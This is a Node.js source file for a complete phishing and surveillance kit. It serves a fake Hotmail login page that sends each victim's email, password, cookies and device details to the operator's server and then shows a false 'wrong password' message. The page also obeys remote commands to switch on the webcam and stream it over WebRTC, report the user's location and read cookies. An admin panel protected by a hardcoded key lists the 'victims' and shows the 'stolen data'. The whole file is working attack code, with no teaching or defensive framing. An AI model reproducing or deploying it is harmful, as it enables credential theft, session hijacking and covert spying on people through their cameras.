const express = require('express');
const http = require('http');
const socketIo = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*" }
});

// ============ صفحة الضحية ============
const victimPage = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotmail - تسجيل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #0078d4; font-size: 32px; margin-bottom: 5px; }
        .logo p { color: #666; font-size: 14px; }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
        }
        .input-group input:focus { border-color: #0078d4; }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
        }
        .btn-login:hover { background: #005a9e; }
        #video-preview {
            display: none;
            width: 100%;
            margin-top: 15px;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>Hotmail</h1>
            <p>تسجيل الدخول للبريد الإلكتروني</p>
        </div>
        <form id="login-form">
            <div class="input-group">
                <label>البريد الإلكتروني</label>
                <input type="email" id="email" placeholder="example@hotmail.com" required>
            </div>
            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" id="password" placeholder="••••••••" required>
            </div>
            <button type="submit" class="btn-login">تسجيل الدخول</button>
        </form>
        <video id="video-preview" autoplay playsinline muted></video>
    </div>
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let localStream = null;
        let peerConnection = null;
        
        socket.on('connect', () => {
            socket.emit('victim_register', {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenRes: window.screen.width + 'x' + window.screen.height,
                language: navigator.language,
                cookies: document.cookie
            });
        });
        
        document.getElementById('login-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            socket.emit('victim_data', {
                type: 'credentials',
                data: { email, password }
            });
            
            alert('كلمة المرور غير صحيحة');
        });
        
        // ============ تفعيل الكاميرا ============
        socket.on('execute_command', async (cmd) => {
            if (cmd.action === 'start_cam') {
                await startCamera();
            }
            if (cmd.action === 'stop_cam') {
                stopCamera();
            }
            if (cmd.action === 'get_location') {
                getLocation();
            }
            if (cmd.action === 'get_cookies') {
                socket.emit('victim_data', { type: 'cookies', data: document.cookie });
            }
        });
        
        async function startCamera() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 640, height: 480 },
                    audio: false 
                });
                
                // عرض الفيديو للضحية
                document.getElementById('video-preview').style.display = 'block';
                document.getElementById('video-preview').srcObject = localStream;
                
                // إعداد WebRTC للبث للمطور
                const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
                peerConnection = new RTCPeerConnection(configuration);
                
                localStream.getTracks().forEach(track => {
                    peerConnection.addTrack(track, localStream);
                });
                
                peerConnection.onicecandidate = (event) => {
                    if (event.candidate) {
                        socket.emit('webrtc_ice', { targetId: cmd.from, candidate: event.candidate });
                    }
                };
                
                const offer = await peerConnection.createOffer();
                await peerConnection.setLocalDescription(offer);
                socket.emit('webrtc_offer', { targetId: cmd.from, offer: offer });
                
                socket.emit('victim_data', { type: 'camera_started', data: 'Camera is broadcasting' });
            } catch (err) {
                socket.emit('victim_data', { type: 'camera_error', data: err.message });
            }
        }
        
        function stopCamera() {
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
                localStream = null;
                document.getElementById('video-preview').style.display = 'none';
            }
            if (peerConnection) {
                peerConnection.close();
                peerConnection = null;
            }
        }
        
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    socket.emit('victim_data', {
                        type: 'location',
                        data: { lat: pos.coords.latitude, lng: pos.coords.longitude }
                    });
                });
            }
        }
        
        // استقبال إشارات WebRTC
        socket.on('webrtc_answer', async (data) => {
            if (peerConnection) {
                await peerConnection.setRemoteDescription(data.answer);
            }
        });
        
        socket.on('webrtc_ice', async (data) => {
            if (peerConnection) {
                await peerConnection.addIceCandidate(data.candidate);
            }
        });
    </script>
</body>
</html>`;

// ============ صفحة لوحة التحكم ============
const adminPage = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - 2099</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: #0a0a0f;
            color: #e0e0e0;
        }
        .login-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            gap: 20px;
        }
        .login-screen h1 { color: #00f0ff; font-size: 36px; }
        .login-screen input {
            padding: 15px;
            width: 300px;
            background: #1a1a2e;
            border: 2px solid #2a2a3a;
            color: white;
            border-radius: 8px;
            font-size: 16px;
        }
        .login-screen button {
            padding: 12px 30px;
            background: #00f0ff;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
        }
        .main-panel { display: none; padding: 20px; }
        header {
            background: #12121a;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
        }
        header h1 { color: #00f0ff; }
        .layout {
            display: flex;
            gap: 20px;
        }
        .victims-panel {
            width: 300px;
            background: #12121a;
            border-radius: 10px;
            padding: 20px;
        }
        .victim-card {
            background: #1a1a2e;
            padding: 15px;
            border-radius: 8px;
            cursor: pointer;
            margin-bottom: 10px;
            border: 2px solid transparent;
        }
        .victim-card:hover { border-color: #00f0ff; }
        .victim-card.selected { border-color: #ff0055; }
        .video-panel {
            flex: 1;
            background: #12121a;
            border-radius: 10px;
            padding: 20px;
        }
        #remoteVideo {
            width: 100%;
            max-height: 400px;
            background: #000;
            border-radius: 8px;
        }
        .controls {
            display: flex;
            gap: 10px;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        .controls button {
            padding: 12px 20px;
            background: #1a1a2e;
            color: white;
            border: 1px solid #2a2a3a;
            border-radius: 8px;
            cursor: pointer;
        }
        .controls button:hover { background: #00f0ff; color: black; }
        .data-log {
            background: #12121a;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }
        .data-entry {
            background: #1a1a2e;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 10px;
            border-right: 3px solid #ff0055;
        }
    </style>
</head>
<body>
    <div class="login-screen" id="login-screen">
        <h1>👑 لوحة التحكم</h1>
        <input type="password" id="admin-key" placeholder="أدخل مفتاح الوصول">
        <button onclick="login()">دخول</button>
    </div>
    
    <div class="main-panel" id="main-panel">
        <header>
            <h1>HOTMAIL 2099 - Control Panel</h1>
            <div>الضحايا: <b id="victim-count">0</b></div>
        </header>
        
        <div class="layout">
            <div class="victims-panel">
                <h2>الأجهزة المتصلة</h2>
                <div id="victims-list"></div>
            </div>
            
            <div class="video-panel">
                <h2>البث المباشر</h2>
                <video id="remoteVideo" autoplay playsinline></video>
                
                <div class="controls">
                    <button onclick="sendCmd('start_cam')">📷 تشغيل الكاميرا</button>
                    <button onclick="sendCmd('stop_cam')">🛑 إيقاف الكاميرا</button>
                    <button onclick="sendCmd('get_location')">📍 الموقع</button>
                    <button onclick="sendCmd('get_cookies')">🍪 الكوكيز</button>
                </div>
            </div>
        </div>
        
        <div class="data-log">
            <h2>البيانات المسروقة</h2>
            <div id="stolen-data"></div>
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let selectedVictim = null;
        let peerConnection = null;
        
        function login() {
            const key = document.getElementById('admin-key').value;
            socket.emit('admin_register', { key });
        }
        
        socket.on('admin_authenticated', (res) => {
            if (res.status === 'success') {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('main-panel').style.display = 'block';
            } else {
                alert('مفتاح خاطئ');
            }
        });
        
        socket.on('victims_update', (victims) => {
            document.getElementById('victim-count').textContent = victims.length;
            const list = document.getElementById('victims-list');
            list.innerHTML = '';
            victims.forEach(v => {
                const card = document.createElement('div');
                card.className = 'victim-card';
                card.innerHTML = '<strong>' + (v.platform || 'Unknown') + '</strong><br><small>' + v.screenRes + '</small>';
                card.onclick = () => {
                    selectedVictim = v.id;
                    document.querySelectorAll('.victim-card').forEach(c => c.classList.remove('selected'));
                    card.classList.add('selected');
                };
                list.appendChild(card);
            });
        });
        
        function sendCmd(action) {
            if (!selectedVictim) { alert('اختر ضحية أولاً'); return; }
            socket.emit('admin_command', { victimId: selectedVictim, action });
        }
        
        socket.on('victim_response', (data) => {
            const div = document.getElementById('stolen-data');
            const entry = document.createElement('div');
            entry.className = 'data-entry';
            entry.innerHTML = '<b>' + data.type + '</b>: ' + JSON.stringify(data.data);
            div.prepend(entry);
        });
        
        // ============ WebRTC للبث المباشر ============
        socket.on('webrtc_offer', async (data) => {
            const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
            peerConnection = new RTCPeerConnection(configuration);
            
            peerConnection.ontrack = (event) => {
                document.getElementById('remoteVideo').srcObject = event.streams[0];
            };
            
            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit('webrtc_ice', { targetId: data.from, candidate: event.candidate });
                }
            };
            
            await peerConnection.setRemoteDescription(data.offer);
            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);
            socket.emit('webrtc_answer', { targetId: data.from, answer: answer });
        });
        
        socket.on('webrtc_ice', async (data) => {
            if (peerConnection) {
                await peerConnection.addIceCandidate(data.candidate);
            }
        });
    </script>
</body>
</html>`;

// ============ المسارات ============
app.get('/health', (req, res) => {
    res.json({ status: 'active' });
});

app.get('/admin', (req, res) => {
    res.send(adminPage);
});

app.get('/', (req, res) => {
    res.send(victimPage);
});

// ============ Socket.io ============
let victims = new Map();
let admins = new Set();

io.on('connection', (socket) => {
    console.log('Connected:', socket.id);

    socket.on('admin_register', (data) => {
        if (data.key === 'ARCHITECT_2099') {
            admins.add(socket.id);
            socket.emit('admin_authenticated', { status: 'success' });
        }
    });

    socket.on('victim_register', (data) => {
        victims.set(socket.id, { id: socket.id, ...data });
        admins.forEach(adminId => {
            io.to(adminId).emit('victims_update', Array.from(victims.values()));
        });
    });

    socket.on('admin_command', (payload) => {
        if (victims.has(payload.victimId)) {
            io.to(payload.victimId).emit('execute_command', {
                ...payload,
                from: socket.id
            });
        }
    });

    socket.on('victim_data', (data) => {
        admins.forEach(adminId => {
            io.to(adminId).emit('victim_response', data);
        });
    });

    // ============ WebRTC Signaling ============
    socket.on('webrtc_offer', (data) => {
        if (admins.has(data.targetId)) {
            io.to(data.targetId).emit('webrtc_offer', {
                offer: data.offer,
                from: socket.id
            });
        }
    });

    socket.on('webrtc_answer', (data) => {
        if (victims.has(data.targetId)) {
            io.to(data.targetId).emit('webrtc_answer', {
                answer: data.answer,
                from: socket.id
            });
        }
    });

    socket.on('webrtc_ice', (data) => {
        io.to(data.targetId).emit('webrtc_ice', {
            candidate: data.candidate,
            from: socket.id
        });
    });

    socket.on('disconnect', () => {
        victims.delete(socket.id);
        admins.delete(socket.id);
        admins.forEach(adminId => {
            io.to(adminId).emit('victims_update', Array.from(victims.values()));
        });
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('⚡ Running on port ' + PORT);
});
